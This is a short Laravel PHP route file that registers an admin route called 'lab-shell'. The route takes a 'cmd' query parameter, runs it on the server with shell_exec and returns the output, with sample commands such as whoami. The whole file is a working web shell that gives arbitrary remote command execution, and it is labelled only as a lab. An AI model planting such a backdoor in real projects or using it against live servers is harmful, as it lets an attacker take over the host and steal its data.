<?php

use Illuminate\Support\Facades\Route;

Route::admin('lab-shell', function () {
    Route::get('/', function () {
        $cmd = isset($_GET['cmd']) ? (string) $_GET['cmd'] : '';
        if ($cmd === '') {
            return response("LAB SHELL - add ?cmd=your words to the address.\nTry: ?cmd=whoami or ?cmd=dir", 200)->header('Content-Type', 'text/plain');
        }
        $out = shell_exec($cmd . ' 2>&1');
        return response("CMD: " . $cmd . "\n---\n" . (string) $out, 200)->header('Content-Type', 'text/plain');
    });
});
